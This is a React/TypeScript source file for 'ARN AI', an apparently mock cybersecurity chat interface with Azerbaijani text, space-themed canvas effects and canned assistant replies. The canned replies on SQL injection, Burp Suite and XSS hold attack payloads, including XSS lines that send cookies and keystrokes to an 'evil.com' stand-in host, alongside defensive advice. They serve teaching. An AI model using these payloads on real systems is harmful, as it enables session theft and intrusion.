/**
 * ARN AI — NEURAL CHAT INTERFACE v6.0
 * Layout problemi həll edilmiş versiya.
 * Artıq parent container-ə (məsələn, sizin sol menyunun yanına) tam 100% oturacaq.
 */

import { useState, useRef, useEffect, useCallback } from 'react'
import ReactMarkdown from 'react-markdown'

// ─────────────────────────────────────────────────────────────────────────────
//  Types
// ─────────────────────────────────────────────────────────────────────────────

interface Message {
  id: string
  role: 'user' | 'assistant'
  content: string
  timestamp: Date
}

interface ChatSession {
  id: string
  title: string
  messages: Message[]
  createdAt: Date
}

interface Star {
  x: number; y: number; z: number
  size: number; bright: number; twOff: number
  r: number; g: number; b: number
}

interface Particle {
  x: number; y: number; vx: number; vy: number
  life: number; max: number; size: number; hue: number
}

interface Arc {
  pts: [number, number][]; life: number; max: number
}

interface Shockwave {
  x: number; y: number; r: number; maxR: number; alpha: number
}

// ─────────────────────────────────────────────────────────────────────────────
//  Factory helpers
// ─────────────────────────────────────────────────────────────────────────────

function mkStar(w: number, h: number): Star {
  const palettes = [
    [255, 255, 255], [199, 210, 254], [191, 219, 254],
    [221, 214, 254], [252, 231, 243], [186, 230, 253],
  ]
  const c = palettes[Math.floor(Math.random() * palettes.length)]
  return {
    x: Math.random() * w, y: Math.random() * h,
    z: Math.random() * 3 + 0.3,
    size: Math.random() * 1.8 + 0.2,
    bright: Math.random() * 0.7 + 0.3,
    twOff: Math.random() * Math.PI * 2,
    r: c[0], g: c[1], b: c[2],
  }
}

function mkParticle(cx: number, cy: number): Particle {
  const angle = Math.random() * Math.PI * 2
  const dist = Math.random() * 250 + 30
  return {
    x: cx + Math.cos(angle) * dist,
    y: cy + Math.sin(angle) * dist,
    vx: (Math.random() - 0.5) * 0.4,
    vy: (Math.random() - 0.5) * 0.4,
    life: Math.random() * 200,
    max: Math.random() * 300 + 150,
    size: Math.random() * 2 + 0.3,
    hue: Math.random() * 80 + 210,
  }
}

function mkArc(cx: number, cy: number): Arc {
  const pts: [number, number][] = [[cx, cy]]
  const a = Math.random() * Math.PI * 2
  let x = cx, y = cy
  for (let i = 0; i < 7; i++) {
    const da = (Math.random() - 0.5) * 1.4
    const step = 15 + Math.random() * 25
    x += Math.cos(a + da * i) * step
    y += Math.sin(a + da * i) * step
    pts.push([x, y])
  }
  return { pts, life: 0, max: Math.random() * 35 + 10 }
}

// ─────────────────────────────────────────────────────────────────────────────
//  Mock AI responses
// ─────────────────────────────────────────────────────────────────────────────

const MOCK_RESPONSES: Record<string, string> = {
  'nmap': `# Nmap ilə Port Scan\n\n**Nmap** (Network Mapper) — şəbəkə kəşfi və təhlükəsizlik auditi üçün istifadə olunan açıq mənbəli alətdir.\n\n## Əsas Scan Növləri\n\n### 1. TCP SYN Scan (Yarı-açıq scan)\n\`\`\`bash\nsudo nmap -sS -p 1-65535 target_ip\n\`\`\`\n\n### 2. Service Version Detection\n\`\`\`bash\nnmap -sV -sC target_ip\n\`\`\`\n\n### 3. OS Detection\n\`\`\`bash\nsudo nmap -O --osscan-guess target_ip\n\`\`\`\n\n### 4. Aggressive Scan\n\`\`\`bash\nnmap -A -T4 target_ip\n\`\`\`\n\n## Nəticələrin Analizi\n\n| Port | Service | Risk |\n|------|---------|------|\n| 22   | SSH     | Orta |\n| 80   | HTTP    | Yüksək |\n| 443  | HTTPS   | Aşağı |\n\n> ⚠️ **Xəbərdarlıq:** Yalnız icazəli sistemlər üzərində test aparın. İcazəsiz scan qanunsuzdur.\n\n**Tövsiyə:** Həmişə \`--script vuln\` parametrindən istifadə edərək zəiflik yoxlaması aparın.`,

  'sql': `# SQL Injection Nədir?\n\n**SQL Injection** (SQLi) — veb tətbiqlərdə verilənlər bazasına müdaxilə etməyə imkan verən kritik zəiflikdir.\n\n## Hücum Növləri\n\n### 1. Classic Union-Based\n\`\`\`sql\n' UNION SELECT username, password FROM users--\n\`\`\`\n\n### 2. Boolean-Based Blind\n\`\`\`sql\n' AND 1=1--    → true\n' AND 1=2--    → false\n\`\`\`\n\n### 3. Time-Based Blind\n\`\`\`sql\n' AND SLEEP(5)--\n\`\`\`\n\n### 4. Error-Based\n\`\`\`sql\n' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version())))--\n\`\`\`\n\n## Müdafiə Yolları\n\n1. **Prepared Statements** istifadə edin:\n\`\`\`python\ncursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))\n\`\`\`\n\n2. **ORM** istifadə edin (SQLAlchemy, Django ORM)\n3. **WAF** (Web Application Firewall) quraşdırın\n4. **Input Validation** tətbiq edin\n\n> 💡 **Qızıl qayda:** Heç vaxt istifadəçi inputunu birbaşa SQL sorğusuna daxil etməyin!`,

  'burp': `# Burp Suite ilə Web Test\n\n**Burp Suite** — veb tətbiqlərin təhlükəsizlik testləri üçün ən populyar alətdir.\n\n## Əsas Modullar\n\n### 1. Proxy (Intercept)\n\`\`\`\nBrowser → Burp Proxy (127.0.0.1:8080) → Target Server\n\`\`\`\nBütün HTTP/HTTPS trafikini kəsib analiz edin.\n\n### 2. Repeater\nSorğuları manual olaraq dəyişdirib yenidən göndərin:\n\`\`\`http\nPOST /login HTTP/1.1\nHost: target.com\nContent-Type: application/x-www-form-urlencoded\n\nusername=admin&password=' OR '1'='1\n\`\`\`\n\n### 3. Intruder (Brute Force)\n\`\`\`\nAttack Type: Sniper\nPayload: /usr/share/wordlists/rockyou.txt\nTarget Parameter: §password§\n\`\`\`\n\n### 4. Scanner (Pro)\n- Avtomatik zəiflik aşkarlama\n- OWASP Top 10 yoxlama\n- Ətraflı hesabat\n\n## Praktik Addımlar\n\n1. **FoxyProxy** ilə brauzeri konfiqurasiya edin\n2. Burp CA sertifikatını quraşdırın\n3. **Scope** təyin edin — yalnız hədəf domenlər\n4. **Sitemap** yaradın\n5. Hər endpoint-i manual test edin\n\n> 🔒 **Etik hacking:** Yalnız bug bounty proqramlarında və ya yazılı icazə ilə test aparın.`,

  'xss': `# XSS (Cross-Site Scripting) Hücumu\n\n**XSS** — istifadəçinin brauzerində zərərli JavaScript kodu icra etməyə imkan verən zəiflikdir.\n\n## XSS Növləri\n\n### 1. Reflected XSS\n\`\`\`html\nhttps://target.com/search?q=<script>alert('XSS')</script>\n\`\`\`\n\n### 2. Stored XSS\n\`\`\`javascript\n// Foruma yazılan zərərli şərh\n<img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">\n\`\`\`\n\n### 3. DOM-Based XSS\n\`\`\`javascript\n// Zəif kod\ndocument.getElementById('output').innerHTML = location.hash.slice(1)\n\n// Exploit\nhttps://target.com/#<img src=x onerror=alert(1)>\n\`\`\`\n\n## Advanced Payloads\n\n\`\`\`javascript\n// Cookie stealing\n<script>\nnew Image().src='https://evil.com/log?c='+btoa(document.cookie)\n</script>\n\n// Keylogger injection\n<script>\ndocument.onkeypress=e=>\n  fetch('https://evil.com/k?'+e.key)\n</script>\n\`\`\`\n\n## Müdafiə\n\n1. **Output Encoding** — HTML, JS, URL encoding\n2. **CSP** (Content Security Policy) header:\n\`\`\`\nContent-Security-Policy: default-src 'self'; script-src 'self'\n\`\`\`\n3. **HttpOnly** cookie flag\n4. **DOMPurify** kitabxanası istifadə edin\n\n> ⚡ XSS OWASP Top 10 siyahısında **#3** yerdədir.`,
}

const DEFAULT_RESPONSE = `## Neural Cavab\n\nSualınız qeydə alındı. Mən **ARN AI** kibertəhlükəsizlik assistantıyam.\n\nAşağıdakı mövzularda sizə kömək edə bilərəm:\n\n- 🔍 **Penetration Testing** — Nmap, Metasploit, Burp Suite\n- 💉 **Web Zəiflikləri** — SQL Injection, XSS, CSRF\n- 🛡️ **Müdafiə** — Firewall, IDS/IPS, WAF\n- 🔐 **Kriptoqrafiya** — Şifrələmə, Hash, PKI\n- 📡 **Şəbəkə Təhlükəsizliyi** — VPN, TLS, Wi-Fi hacking\n\n\`\`\`bash\n# Başlamaq üçün nümunə əmr:\nnmap -sV -sC -O target_ip\n\`\`\`\n\n> 💡 Daha ətraflı cavab üçün konkret mövzu seçin.`

function getAIResponse(input: string): string {
  const lower = input.toLowerCase()
  if (lower.includes('nmap') || lower.includes('port scan') || lower.includes('port')) return MOCK_RESPONSES['nmap']
  if (lower.includes('sql') || lower.includes('injection')) return MOCK_RESPONSES['sql']
  if (lower.includes('burp') || lower.includes('web test')) return MOCK_RESPONSES['burp']
  if (lower.includes('xss') || lower.includes('cross-site') || lower.includes('script')) return MOCK_RESPONSES['xss']
  return DEFAULT_RESPONSE
}

// ─────────────────────────────────────────────────────────────────────────────
//  Suggestions
// ─────────────────────────────────────────────────────────────────────────────

const SUGGESTIONS = [
  'Nmap ilə port scan necə aparılır?',
  'SQL injection nədir?',
  'Burp Suite ilə web test',
  'XSS hücumu nədir?',
]

// ─────────────────────────────────────────────────────────────────────────────
//  Code Block
// ─────────────────────────────────────────────────────────────────────────────

const CodeBlock = ({ language, value }: { language: string; value: string }) => {
  const [copied, setCopied] = useState(false)
  const handleCopy = () => {
    navigator.clipboard.writeText(value)
    setCopied(true)
    setTimeout(() => setCopied(false), 2000)
  }
  return (
    <div style={{
      borderRadius: 10, overflow: 'hidden', margin: '12px 0',
      border: '1px solid rgba(99,102,241,0.3)',
      background: 'rgba(0,0,0,0.5)',
      width: '100%',
    }}>
      <div style={{
        display: 'flex', alignItems: 'center', justifyContent: 'space-between',
        padding: '6px 14px',
        background: 'rgba(99,102,241,0.08)',
        borderBottom: '1px solid rgba(99,102,241,0.2)',
      }}>
        <span style={{
          fontFamily: "'Space Mono', monospace", fontSize: 9,
          color: '#818cf8', letterSpacing: 2,
        }}>
          // {language || 'code'}
        </span>
        <button onClick={handleCopy} style={{
          fontFamily: "'Space Mono', monospace", fontSize: 9, letterSpacing: 2,
          padding: '3px 10px', borderRadius: 6, cursor: 'pointer',
          background: copied ? 'rgba(74,222,128,0.12)' : 'rgba(99,102,241,0.12)',
          color: copied ? '#4ade80' : '#818cf8',
          border: `1px solid ${copied ? 'rgba(74,222,128,0.3)' : 'rgba(99,102,241,0.3)'}`,
          transition: 'all 0.2s',
        }}>
          {copied ? '✓ KOPYALANDI' : 'KOPYALA'}
        </button>
      </div>
      <pre style={{ margin: 0, padding: '14px', background: 'transparent', overflowX: 'auto' }}>
        <code style={{
          fontFamily: "'Space Mono', monospace", fontSize: '0.8rem', lineHeight: 1.65, 
          color: '#e2e8f0', whiteSpace: 'pre-wrap', wordBreak: 'break-word'
        }}>
          {value}
        </code>
      </pre>
    </div>
  )
}

// ─────────────────────────────────────────────────────────────────────────────
//  Markdown Renderer
// ─────────────────────────────────────────────────────────────────────────────

const MarkdownMessage = ({ content }: { content: string }) => (
  <ReactMarkdown
    components={{
      code({ className, children, ...props }) {
        const match = /language-(\w+)/.exec(className || '')
        return match ? (
          <CodeBlock language={match[1]} value={String(children).replace(/\n$/, '')} />
        ) : (
          <code style={{
            background: 'rgba(99,102,241,0.15)', color: '#a5b4fc',
            fontFamily: "'Space Mono', monospace", fontSize: '0.8rem',
            padding: '2px 6px', borderRadius: 4,
          }} {...props}>{children}</code>
        )
      },
      h1: ({ children }) => <h1 style={{ fontSize: '1.25rem', fontWeight: 700, color: '#e2e8f0', margin: '1rem 0 0.5rem', letterSpacing: '-0.02em' }}>{children}</h1>,
      h2: ({ children }) => <h2 style={{ fontSize: '1.05rem', fontWeight: 700, color: '#e2e8f0', margin: '0.9rem 0 0.4rem' }}>{children}</h2>,
      h3: ({ children }) => <h3 style={{ fontSize: '0.95rem', fontWeight: 600, color: '#a5b4fc', margin: '0.8rem 0 0.35rem' }}>{children}</h3>,
      p: ({ children }) => <p style={{ marginBottom: '0.65rem', lineHeight: 1.75, color: '#cbd5e1', fontSize: '0.92rem' }}>{children}</p>,
      ul: ({ children }) => <ul style={{ marginBottom: '0.7rem', paddingLeft: '1.2rem' }}>{children}</ul>,
      ol: ({ children }) => <ol style={{ marginBottom: '0.7rem', paddingLeft: '1.2rem', listStyleType: 'decimal' }}>{children}</ol>,
      li: ({ children }) => <li style={{ color: '#cbd5e1', lineHeight: 1.7, fontSize: '0.92rem', marginBottom: '0.2rem', listStyleType: 'disc' }}>{children}</li>,
      strong: ({ children }) => <strong style={{ fontWeight: 700, color: '#e2e8f0' }}>{children}</strong>,
      blockquote: ({ children }) => (
        <blockquote style={{
          borderLeft: '2px solid #818cf8', color: '#94a3b8',
          background: 'rgba(99,102,241,0.06)', padding: '6px 12px',
          borderRadius: '0 6px 6px 0', margin: '8px 0', fontSize: '0.9rem',
        }}>{children}</blockquote>
      ),
      hr: () => <hr style={{ borderColor: 'rgba(99,102,241,0.2)', margin: '10px 0' }} />,
    }}
  >
    {content}
  </ReactMarkdown>
)

// ─────────────────────────────────────────────────────────────────────────────
//  Thinking Animation
// ─────────────────────────────────────────────────────────────────────────────

const ThinkingDots = () => (
  <div style={{ display: 'flex', alignItems: 'center', gap: 8, padding: '8px 0' }}>
    <span style={{ fontFamily: "'Space Mono', monospace", fontSize: 9, color: 'rgba(129,140,248,0.5)', letterSpacing: 2 }}>
      // neural.processing
    </span>
    {[0, 1, 2].map(i => (
      <div key={i} style={{
        width: 5, height: 5, borderRadius: '50%',
        background: '#818cf8',
        animation: `neuralPulse 1.2s ease-in-out ${i * 0.2}s infinite`,
        boxShadow: '0 0 6px #818cf8',
      }} />
    ))}
  </div>
)

// ─────────────────────────────────────────────────────────────────────────────
//  Corner decoration
// ─────────────────────────────────────────────────────────────────────────────

function CornerDecor({ accent }: { accent: string }) {
  const corner: React.CSSProperties = {
    position: 'absolute', width: 10, height: 10,
    borderColor: accent, borderStyle: 'solid', opacity: 0.5,
  }
  return (
    <>
      <div style={{ ...corner, top: 8, left: 8, borderWidth: '1px 0 0 1px' }} />
      <div style={{ ...corner, top: 8, right: 8, borderWidth: '1px 1px 0 0' }} />
      <div style={{ ...corner, bottom: 8, left: 8, borderWidth: '0 0 1px 1px' }} />
      <div style={{ ...corner, bottom: 8, right: 8, borderWidth: '0 1px 1px 0' }} />
    </>
  )
}

// ─────────────────────────────────────────────────────────────────────────────
//  Main Component
// ─────────────────────────────────────────────────────────────────────────────

export default function ChatPage() {
  const [input, setInput] = useState('')
  const [isLoading, setIsLoading] = useState(false)
  const [sidebarOpen, setSidebarOpen] = useState(false)
  const [chats, setChats] = useState<ChatSession[]>([])
  const [currentChatId, setCurrentChatId] = useState<string | null>(null)
  
  const containerRef = useRef<HTMLDivElement>(null)
  const messagesEndRef = useRef<HTMLDivElement>(null)
  const textareaRef = useRef<HTMLTextAreaElement>(null)

  // Canvas refs
  const canvasRef = useRef<HTMLCanvasElement>(null)
  const rafRef = useRef(0)
  const tickRef = useRef(0)
  const mouseRef = useRef({ x: 0.5, y: 0.5 })
  const starsRef = useRef<Star[]>([])
  const particlesRef = useRef<Particle[]>([])
  const arcsRef = useRef<Arc[]>([])
  const clickFX = useRef<Shockwave[]>([])

  const currentChat = chats.find(c => c.id === currentChatId) || null

  // ── Initialize first chat
  useEffect(() => {
    const id = Date.now().toString()
    const newChat: ChatSession = {
      id, title: 'Yeni Söhbət', messages: [], createdAt: new Date()
    }
    setChats([newChat])
    setCurrentChatId(id)
  }, [])

  // ── Scroll to bottom on new messages
  useEffect(() => {
    messagesEndRef.current?.scrollIntoView({ behavior: 'smooth' })
  }, [currentChat?.messages])

  // ── Auto-resize textarea
  useEffect(() => {
    const ta = textareaRef.current
    if (!ta) return
    ta.style.height = 'auto'
    ta.style.height = Math.min(ta.scrollHeight, 128) + 'px'
  }, [input])

  // ── Canvas logic - Pəncərəyə yox, içində olduğu div-ə görə ölçüləndirilib ──
  useEffect(() => {
    const canvas = canvasRef.current
    const container = containerRef.current
    if (!canvas || !container) return
    const ctx = canvas.getContext('2d')!

    const resize = () => {
      // Artıq window.innerWidth əvəzinə container-in ölçülərini götürür
      canvas.width = container.clientWidth
      canvas.height = container.clientHeight
      
      // Ulduzları yeni ölçüyə görə yenidən yarat (əgər ilk dəfədirsə və ya ölçü kəskin dəyişibsə)
      if (starsRef.current.length === 0) {
        starsRef.current = Array.from({ length: 400 }, () => mkStar(canvas.width, canvas.height))
        particlesRef.current = Array.from({ length: 25 }, () => mkParticle(canvas.width / 2, canvas.height / 2))
      }
    }
    resize()
    
    // ResizeObserver istifadə edərək yalnız container-in ölçüsü dəyişəndə reaksiya veririk
    const observer = new ResizeObserver(() => resize())
    observer.observe(container)

    const draw = () => {
      rafRef.current = requestAnimationFrame(draw)
      const w = canvas.width, h = canvas.height
      const cx = w / 2, cy = h / 2
      tickRef.current += 0.008
      const t = tickRef.current
      const mx = mouseRef.current.x
      const my = mouseRef.current.y

      // Background with trail
      ctx.fillStyle = 'rgba(1,1,12,0.25)'
      ctx.fillRect(0, 0, w, h)

      // Deep space nebulae
      const nebs = [
        { dx: -0.3, dy: -0.2, r: 0.45, hue: 241, a: 0.04 },
        { dx: 0.25, dy: 0.15, r: 0.35, hue: 270, a: 0.035 },
        { dx: 0.0, dy: -0.3, r: 0.28, hue: 195, a: 0.03 },
      ]
      nebs.forEach(n => {
        const px = (mx - 0.5) * 12, py = (my - 0.5) * 12
        const nx = cx + n.dx * w + px
        const ny = cy + n.dy * h + py
        const nr = n.r * w
        const g = ctx.createRadialGradient(nx, ny, 0, nx, ny, nr)
        g.addColorStop(0, `hsla(${n.hue},75%,55%,${n.a})`)
        g.addColorStop(0.5, `hsla(${n.hue},65%,45%,${n.a * 0.4})`)
        g.addColorStop(1, 'rgba(0,0,0,0)')
        ctx.fillStyle = g
        ctx.fillRect(0, 0, w, h)
      })

      // Stars
      starsRef.current.forEach(s => {
        const px = (mx - 0.5) * s.z * 20
        const py = (my - 0.5) * s.z * 20
        const tw = 0.65 + Math.sin(t * 1.8 + s.twOff) * 0.35
        const alpha = s.bright * tw
        const sx = s.x + px, sy = s.y + py
        
        // Pəncərədən kənara çıxan ulduzları gizlət
        if(sx < 0 || sx > w || sy < 0 || sy > h) return;

        ctx.globalAlpha = alpha * 0.7
        ctx.fillStyle = `rgb(${s.r},${s.g},${s.b})`
        ctx.beginPath()
        ctx.arc(sx, sy, s.size * tw, 0, Math.PI * 2)
        ctx.fill()
        if (s.size > 1.4) {
          const halo = ctx.createRadialGradient(sx, sy, 0, sx, sy, s.size * 3.5)
          halo.addColorStop(0, `rgba(${s.r},${s.g},${s.b},${alpha * 0.2})`)
          halo.addColorStop(1, 'rgba(0,0,0,0)')
          ctx.fillStyle = halo
          ctx.beginPath()
          ctx.arc(sx, sy, s.size * 3.5, 0, Math.PI * 2)
          ctx.fill()
        }
      })
      ctx.globalAlpha = 1

      // Ambient particles
      particlesRef.current.forEach(p => {
        const dx = cx + (mx - 0.5) * 40 - p.x
        const dy = cy + (my - 0.5) * 40 - p.y
        const dist = Math.sqrt(dx * dx + dy * dy) || 1
        p.vx += dx / dist * 0.001
        p.vy += dy / dist * 0.001
        p.vx *= 0.985
        p.vy *= 0.985
        p.x += p.vx
        p.y += p.vy
        p.life++
        if (p.life >= p.max) Object.assign(p, mkParticle(cx, cy))
        const prog = p.life / p.max
        const pa = Math.sin(prog * Math.PI) * 0.4
        ctx.beginPath()
        ctx.arc(p.x, p.y, p.size, 0, Math.PI * 2)
        ctx.fillStyle = `hsla(${p.hue},75%,70%,${pa})`
        ctx.fill()
      })

      // Electric arcs
      if (Math.random() < 0.02 && arcsRef.current.length < 5) {
        const ax = Math.random() * w
        const ay = Math.random() * h
        arcsRef.current.push(mkArc(ax, ay))
      }
      arcsRef.current = arcsRef.current.filter(a => a.life < a.max)
      ctx.save()
      ctx.shadowBlur = 4
      ctx.shadowColor = '#c7d2fe'
      arcsRef.current.forEach(arc => {
        arc.life++
        const progress = arc.life / arc.max
        const aAlpha = Math.sin(progress * Math.PI) * 0.4
        ctx.strokeStyle = `rgba(199,210,254,${aAlpha})`
        ctx.lineWidth = 0.4
        ctx.beginPath()
        arc.pts.forEach(([x, y], i) => {
          if (i === 0) ctx.moveTo(x, y)
          else ctx.lineTo(x, y)
        })
        ctx.stroke()
      })
      ctx.restore()

      // Shockwaves
      clickFX.current = clickFX.current.filter(s => s.alpha > 0.008)
      clickFX.current.forEach(s => {
        s.r += (s.maxR - s.r) * 0.09
        s.alpha *= 0.92
        for (let ring = 0; ring < 3; ring++) {
          const rr = s.r - ring * 15
          if (rr < 0) continue
          ctx.beginPath()
          ctx.arc(s.x, s.y, rr, 0, Math.PI * 2)
          ctx.strokeStyle = `rgba(99,102,241,${s.alpha * (1 - ring * 0.25)})`
          ctx.lineWidth = 1.2 - ring * 0.3
          ctx.stroke()
        }
      })

      // Subtle vignette
      const vig = ctx.createRadialGradient(cx, cy, Math.min(w,h) * 0.4, cx, cy, Math.max(w,h) * 0.9)
      vig.addColorStop(0, 'rgba(0,0,0,0)')
      vig.addColorStop(1, 'rgba(0,0,8,0.55)')
      ctx.fillStyle = vig
      ctx.fillRect(0, 0, w, h)
    }

    draw()
    return () => {
      cancelAnimationFrame(rafRef.current)
      observer.disconnect()
    }
  }, [])

  // ── Mouse tracking
  useEffect(() => {
    const onMove = (e: MouseEvent) => {
      // Siçan izləməni sadələşdirdik ki, container daxilində tam işləsin
      mouseRef.current.x = e.clientX / window.innerWidth
      mouseRef.current.y = e.clientY / window.innerHeight
    }
    window.addEventListener('mousemove', onMove)
    return () => window.removeEventListener('mousemove', onMove)
  }, [])

  // ── Click shockwave
  const onBgClick = useCallback((e: React.MouseEvent) => {
    const rect = containerRef.current?.getBoundingClientRect()
    if(!rect) return
    const x = e.clientX - rect.left
    const y = e.clientY - rect.top
    clickFX.current.push({ x, y, r: 4, maxR: 160, alpha: 0.7 })
    if (clickFX.current.length > 8) clickFX.current.shift()
  }, [])

  // ── Create & Delete Chat
  const createNewChat = () => {
    const id = Date.now().toString()
    const newChat: ChatSession = { id, title: 'Yeni Söhbət', messages: [], createdAt: new Date() }
    setChats(prev => [newChat, ...prev])
    setCurrentChatId(id)
    setSidebarOpen(false)
  }

  const deleteChat = (id: string) => {
    setChats(prev => {
      const updated = prev.filter(c => c.id !== id)
      if (currentChatId === id) {
        if (updated.length > 0) {
          setCurrentChatId(updated[0].id)
        } else {
          const newId = Date.now().toString()
          setCurrentChatId(newId)
          return [{ id: newId, title: 'Yeni Söhbət', messages: [], createdAt: new Date() }]
        }
      }
      return updated
    })
  }

  // ── Send message
  const handleSend = async () => {
    if (!input.trim() || isLoading) return

    let chatId = currentChatId
    if (!chatId) {
      const id = Date.now().toString()
      const newChat: ChatSession = { id, title: 'Yeni Söhbət', messages: [], createdAt: new Date() }
      setChats(prev => [newChat, ...prev])
      chatId = id
      setCurrentChatId(id)
    }

    const userMessage: Message = { id: Date.now().toString(), role: 'user', content: input.trim(), timestamp: new Date() }
    const userInput = input.trim()
    setInput('')
    setIsLoading(true)

    setChats(prev => prev.map(c =>
      c.id !== chatId ? c : {
        ...c,
        title: c.messages.length === 0 ? userInput.slice(0, 30) + (userInput.length > 30 ? '...' : '') : c.title,
        messages: [...c.messages, userMessage]
      }
    ))

    const assistantId = (Date.now() + 1).toString()
    const assistantMessage: Message = { id: assistantId, role: 'assistant', content: '', timestamp: new Date() }

    setChats(prev => prev.map(c =>
      c.id !== chatId ? c : { ...c, messages: [...c.messages, assistantMessage] }
    ))

    // Simulate streaming response
    const fullResponse = getAIResponse(userInput)
    const chars = fullResponse.split('')
    let accumulated = ''

    for (let i = 0; i < chars.length; i++) {
      accumulated += chars[i]
      const content = accumulated
      setChats(prev => prev.map(c =>
        c.id !== chatId ? c : {
          ...c,
          messages: c.messages.map(m =>
            m.id === assistantId ? { ...m, content } : m
          )
        }
      ))
      const delay = chars[i] === ' ' ? 3 : chars[i] === '\n' ? 15 : 5
      await new Promise(r => setTimeout(r, delay))
    }

    setIsLoading(false)
  }

  const handleKeyDown = (e: React.KeyboardEvent) => {
    if (e.key === 'Enter' && !e.shiftKey) { e.preventDefault(); handleSend() }
  }

  const tokenUsed = currentChat?.messages.filter(m => m.role === 'user').length || 0
  const tokenLimit = 50
  const tokenPct = Math.min((tokenUsed / tokenLimit) * 100, 100)

  return (
    <div
      ref={containerRef}
      style={{
        // ƏSAS DƏYİŞİKLİK BURADADIR: 'position: fixed' və 'inset: 0' silindi.
        // İndi bu div parent layihənizin hündürlüyünü və enini tamamilə 100% dolduracaq.
        position: 'relative',
        width: '100%',
        height: '100vh', // Əgər sizin main container artıq h-screen-dirsə, bunu '100%' edə bilərsiniz.
        background: '#01010c',
        overflow: 'hidden', 
        fontFamily: "'Space Mono', monospace",
        display: 'flex',
      }}
      onClick={onBgClick}
    >
      {/* ── Keyframes ────────────────────────────────────────────────── */}
      <style>{`
        @keyframes neuralPulse {
          0%, 100% { opacity: 0.3; transform: scale(0.8); }
          50% { opacity: 1; transform: scale(1.2); }
        }
        @keyframes fadeSlideIn {
          from { opacity: 0; transform: translateY(12px); }
          to { opacity: 1; transform: translateY(0); }
        }
        @keyframes fadeUp {
          from { opacity: 0; transform: translateY(24px); }
          to { opacity: 1; transform: translateY(0); }
        }
        @keyframes scanH {
          from { transform: translateX(-150%); }
          to { transform: translateX(500%); }
        }
        @keyframes corePulse {
          0%, 100% { box-shadow: 0 0 12px rgba(99,102,241,0.4), 0 0 24px rgba(99,102,241,0.15); }
          50% { box-shadow: 0 0 25px rgba(99,102,241,0.7), 0 0 50px rgba(99,102,241,0.25); }
        }
        @keyframes borderPulse {
          0%,100% { opacity: 0.35; }
          50% { opacity: 0.9; }
        }
        @keyframes logoPulse {
          0%,100% { box-shadow: 0 0 18px rgba(99,102,241,0.45); }
          50% { box-shadow: 0 0 35px rgba(99,102,241,0.8), 0 0 60px rgba(99,102,241,0.25); }
        }
        @keyframes statusBlink {
          0%,100% { opacity: 1; }
          50% { opacity: 0.35; }
        }
        @keyframes shimmer {
          from { background-position: 200% 0; }
          to { background-position: -200% 0; }
        }
        @keyframes msgAppear {
          from { opacity: 0; transform: translateY(8px) scale(0.98); }
          to { opacity: 1; transform: translateY(0) scale(1); }
        }
        @keyframes glowRing {
          0%,100% { box-shadow: 0 0 8px rgba(99,102,241,0.3); }
          50% { box-shadow: 0 0 20px rgba(99,102,241,0.6), 0 0 40px rgba(99,102,241,0.2); }
        }
        @keyframes spin {
          to { transform: rotate(360deg); }
        }
        .msg-appear { animation: msgAppear 0.4s cubic-bezier(0.16,1,0.3,1) both; }
        textarea::placeholder {
          color: rgba(148,163,184,0.35);
          font-family: 'Space Mono', monospace;
          font-size: 11px;
          letter-spacing: 1px;
        }
        textarea { scrollbar-width: none; }
        textarea::-webkit-scrollbar { display: none; }
        ::-webkit-scrollbar { width: 4px; }
        ::-webkit-scrollbar-track { background: transparent; }
        ::-webkit-scrollbar-thumb { background: rgba(99,102,241,0.2); border-radius: 4px; }
        ::-webkit-scrollbar-thumb:hover { background: rgba(99,102,241,0.4); }
      `}</style>

      {/* ── 3D Space Canvas ──────────────────────────────────────────── */}
      <canvas
        ref={canvasRef}
        style={{ position: 'absolute', top: 0, left: 0, zIndex: 0 }}
      />

      {/* ── Scanlines & FX ────────────────────────────────────────────── */}
      <div style={{
        position: 'absolute', inset: 0, zIndex: 1, pointerEvents: 'none',
        backgroundImage: 'repeating-linear-gradient(0deg, transparent, transparent 3px, rgba(0,200,180,0.005) 3px, rgba(0,200,180,0.005) 4px)',
      }} />
      <div style={{
        position: 'absolute', inset: 0, zIndex: 1, pointerEvents: 'none',
        backgroundImage: 'linear-gradient(90deg, rgba(255,0,128,0.008) 0%, transparent 30%, transparent 70%, rgba(0,255,255,0.008) 100%)',
      }} />

      {/* ══════════════════════════════════════════════════════════════════
          DAXİLİ SIDEBAR (Sizin öz vebsayt menyunuz olduğuna görə bunu mobil üçü saxlayaq)
      ══════════════════════════════════════════════════════════════════ */}
      {sidebarOpen && (
        <div
          style={{ position: 'absolute', inset: 0, zIndex: 80, background: 'rgba(1,1,12,0.6)', backdropFilter: 'blur(4px)' }}
          onClick={() => setSidebarOpen(false)}
        />
      )}

      <div
        onClick={e => e.stopPropagation()}
        style={{
          position: 'absolute', top: 0, left: 0, bottom: 0, width: 300, zIndex: 90,
          background: 'rgba(2,2,16,0.96)', borderRight: '1px solid rgba(99,102,241,0.15)',
          backdropFilter: 'blur(30px)', display: 'flex', flexDirection: 'column',
          transform: sidebarOpen ? 'translateX(0)' : 'translateX(-100%)',
          transition: 'transform 0.4s cubic-bezier(0.16,1,0.3,1)',
          overflow: 'hidden',
        }}
      >
        <CornerDecor accent="#818cf8" />
        <div style={{ padding: '20px 20px 16px', borderBottom: '1px solid rgba(99,102,241,0.12)' }}>
          <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: 16 }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
              <div style={{ width: 32, height: 32, borderRadius: 9, background: 'linear-gradient(135deg, #6366f1, #9333ea)', display: 'flex', alignItems: 'center', justifyContent: 'center', boxShadow: '0 0 18px rgba(99,102,241,0.5)', animation: 'logoPulse 2.5s ease-in-out infinite' }}>
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="2.5" strokeLinecap="round"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2" /></svg>
              </div>
              <span style={{ fontSize: 14, fontWeight: 700, letterSpacing: 3, background: 'linear-gradient(135deg, #818cf8, #c084fc)', WebkitBackgroundClip: 'text', WebkitTextFillColor: 'transparent' }}>ARN AI</span>
            </div>
            <button onClick={() => setSidebarOpen(false)} style={{ background: 'rgba(255,255,255,0.04)', border: '1px solid rgba(255,255,255,0.1)', color: 'rgba(255,255,255,0.4)', width: 28, height: 28, borderRadius: 6, cursor: 'pointer', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>✕</button>
          </div>
